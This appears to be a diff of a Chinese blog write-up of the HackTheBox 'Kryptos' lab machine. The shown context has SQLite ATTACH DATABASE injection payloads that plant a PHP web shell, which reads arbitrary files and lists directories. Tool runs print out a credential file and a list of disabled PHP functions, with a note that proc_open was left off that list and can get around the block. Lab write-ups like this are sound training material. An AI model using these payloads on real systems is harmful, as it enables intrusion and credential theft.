 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos </span><br><span class="line">╰─$ echo -n PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT4zMDEgTW92ZWQgUGVybWFuZW50bHk8L3RpdGxlPgo8L2hlYWQ+PGJvZHk+CjxoMT5Nb3ZlZCBQZXJtYW5lbnRseTwvaDE+CjxwPlRoZSBkb2N1bWVudCBoYXMgbW92ZWQgPGEgaHJlZj0iaHR0cDovLzEyNy4wLjAuMS9kZXYvIj5oZXJlPC9hPi48L3A+Cjxocj4KPGFkZHJlc3M+QXBhY2hlLzIuNC4yOSAoVWJ1bnR1KSBTZXJ2ZXIgYXQgMTI3LjAuMC4xIFBvcnQgODA8L2FkZHJlc3M+CjwvYm9keT48L2h0bWw+Cg== | base64 -d</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;301 Moved Permanently&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Moved Permanently&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The document has moved &lt;a href="http://127.0.0.1/dev/"&gt;here&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
@@ -437,10 +437,10 @@
 <li>目录<code>d9e28afcf0b274a5e0542abb67db0784/books.db</code>是<code>world writable</code>的，如果想上传shell，这是很好的目标。</li>
 </ol>
 <p>先看一下sqlite3的exec函数<a href="https://www.php.net/manual/zh/sqlite3.exec.php" target="_blank" rel="noopener"><code>SQLite3::exec</code></a>：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/33.png" alt="33"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/33.png" alt="33"></p>
 <p>该函数能够对指定的database执行无结果查询。相比于<code>$db-&gt;query</code>，<code>$db-&gt;qeury</code>更常用于SELECT语句，而<code>$db-&gt;exec</code>更常用于CREATE，DELETE，DROP，INSERT和UPDATE等操作。</p>
 <p>而且搜索sqlite3注入的<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" target="_blank" rel="noopener">payload</a>，发现了<strong>Attach Database</strong>的注入方式：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/34.png" alt="34"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/34.png" alt="34"></p>
 <p>对应的注入语句为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#39;d9e28afcf0b274a5e0542abb67db0784&#x2F;evil.php&#39; as evil;</span><br><span class="line">CREATE TABLE evil.pwn2 (dataz text);</span><br><span class="line">INSERT INTO evil.pwn2 (dataz) VALUES (&#39;&lt;?php phpinfo();?&gt;&#39;);</span><br></pre></td></tr></table></figure>
 
@@ -455,19 +455,19 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~&#x2F;Kryptos&#x2F;rc4_decryptor </span><br><span class="line">╰─$ python3 rc4_decryptor.py http:&#x2F;&#x2F;127.0.0.1&#x2F;dev&#x2F;sqlite_test_page.php\?no_results\&#x3D;1111\&amp;bookid\&#x3D;1%3bATTACH+DATABASE+%27d9e28afcf0b274a5e0542abb67db0784%2fevil.php%27+as+evil%3b+CREATE+TABLE+evil.pwn1+\(dataz+text\)%3b+INSERT+INTO+evil.pwn1+\(dataz\)+VALUES+\(%27%3c%3fphp+phpinfo\(\)%3b%3f%3e%27\)%3b  admin admin 10.10.14.33</span><br><span class="line">[*] Your token is  c74c2891ff701de5cdd4d0731c4dc530cabdd8befe1b9e9e430e88f1946a744d</span><br><span class="line">[*] Login success, the cookies is nhvjr1q51cbugevg3go1t9hd56</span><br><span class="line">[*] Get the source file......</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Opened database successfully</span><br><span class="line">Query : SELECT * FROM books WHERE id&#x3D;1;ATTACH DATABASE &#39;d9e28afcf0b274a5e0542abb67db0784&#x2F;evil.php&#39; as evil; CREATE TABLE evil.pwn1 (dataz text); INSERT INTO evil.pwn1 (dataz) VALUES (&#39;&lt;?php phpinfo();?&gt;&#39;);</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
 
 <p>生成的<code>evil.php</code>应该放在<code>dev/d9e28afcf0b274a5e0542abb67db0784/</code>目录下，但是直接访问<a href="http://10.10.10.129/dev/d9e28afcf0b274a5e0542abb67db0784/evil.php" target="_blank" rel="noopener">http://10.10.10.129/dev/d9e28afcf0b274a5e0542abb67db0784/evil.php</a> 显然不行，因为<code>dev/</code>目录不是公开的：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/35.png" alt="35"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/35.png" alt="35"></p>
 <p>所以，还是只能通过rc4解密获取phpinfo页面，将页面保存到<code>phpinfo.html</code>中：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos/rc4_decryptor </span><br><span class="line">╰─$ python3 rc4_decryptor.py http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/evil.php admin admin 10.10.14.33 &gt; phpinfo.html</span><br></pre></td></tr></table></figure>
 
 <p>打开phpinfo.html查看被禁用的函数：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/36.png" alt="36"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/36.png" alt="36"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,dl,passthru,exec,shell_exec,popen,escapeshellcmd,escapeshellarg,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,</span><br></pre></td></tr></table></figure>
 
 <p>一些常用的系统命令执行函数都被禁止了：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">exec</span><br><span class="line">shell_exec</span><br><span class="line">popen</span><br></pre></td></tr></table></figure>
 
 <p>但是函数<code>proc_open</code>并没有在黑名单中，所以一种方式是，我们可以利用该函数来执行系统命令；另一个是，其他函数如路径遍历函数，文件读取函数都没有被禁掉，而且open_basedir并没有限制：</p>
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/37.png" alt="37"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/37.png" alt="37"></p>
 <h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>尝试第二种方式，任意文件读取。通过同样的方式上传shell：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#39;d9e28afcf0b274a5e0542abb67db0784&#x2F;evil.php&#39; as evil;</span><br><span class="line">CREATE TABLE evil.attack (dataz text);</span><br><span class="line">INSERT INTO evil.attack (dataz) VALUES (&#39;&lt;?php print_r(scandir($_GET[&quot;dir&quot;])); print_r(file_get_contents($_GET[&quot;file&quot;]));?&gt;&#39;);</span><br></pre></td></tr></table></figure>
 
@@ -499,7 +499,7 @@
 <p>读取<code>creds.old</code>：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos/rc4_decryptor </span><br><span class="line">╰─$ python3 rc4_decryptor.py http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/evil.php\?file\=/home/rijndael/creds.old admin admin 10.10.14.33</span><br><span class="line">[*] Your token is  8bf4be518afffac25223c95d820120f4c5c48d78be90ee6ac8993fd81050041c</span><br><span class="line">[*] Login success, the cookies is ee89he50mg3es79ab5fsa53400</span><br><span class="line">[*] Get the source file......</span><br><span class="line">��U�1rijndael / Password1ATE TABLE attack2 (dataz text)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/38.png" alt="38"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/38.png" alt="38"></p>
 <p>得到<code>rijndael / Password1</code>，用该账号密码登录ssh失败，看来也不是密码，可能是旧密码，所以名字为<code>creds.old</code>，那么新密码可能就存在<code>creds.txt</code>中。</p>
 <p>为了更清晰地读取文件，稍微修改下ATTACH DATABASE语句：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;ATTACH DATABASE &#39;d9e28afcf0b274a5e0542abb67db0784&#x2F;evil.php&#39; as evil;</span><br><span class="line">CREATE TABLE evil.attack (dataz text);</span><br><span class="line">INSERT INTO evil.attack (dataz) VALUES (&#39;&lt;?php echo &quot;\n\n\n\n\n&quot;; echo base64_encode(file_get_contents(&quot;$_GET[file]&quot;)); echo &quot;\n\n\n\n\n&quot; ?&gt;&#39;);</span><br></pre></td></tr></table></figure>
@@ -510,7 +510,7 @@
 <p>得到结果：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/Kryptos/rc4_decryptor </span><br><span class="line">╰─$ python3 rc4_decryptor.py http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/evil.php\?file\=/home/rijndael/creds.txt admin admin 10.10.14.33</span><br><span class="line">[*] Your token is  4dbcc65931d5c7ad4f97efb713d92631f41b75239a5a93fe1493aea213d55f3d</span><br><span class="line">[*] Login success, the cookies is dh7322cq7l5s8eng32gaoamc9e</span><br><span class="line">[*] Get the source file......</span><br><span class="line">��f�SableattackattackCREATE TABLE attack (dataz text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">╭─kali@kali ~/Kryptos/rc4_decryptor </span><br><span class="line">╰─$</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/39.png" alt="39"></p>
+<p><img src="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/39.png" alt="39"></p>
 <p>原来是经过vim加密的文件，估计涉及到一些crypto领域的知识了，这又再次和靶机的名称<strong>Kryptos</strong>相呼应了。但作为一只web狗，做到这里也觉得差不多了，所以后面的部分以后有机会再做了。</p>
 <h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这个靶机最后也没有完成，但是我觉得其中涉及到的web部分的知识都挺有意思的，尤其是通过pdo中的dsn注入，改变ip地址（或是端口）让目标服务器上的应用程序连接我们本地的mysql服务器来绕过登录限制，学到了新的姿势。</p>
 
@@ -527,7 +527,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://bantttian.github.io/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/">https://bantttian.github.io/2020/12/12/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</a></span>
+                        <span><a href="https://bantttian.github.io/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/">https://bantttian.github.io/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</a></span>
                     </p>
                 
                 
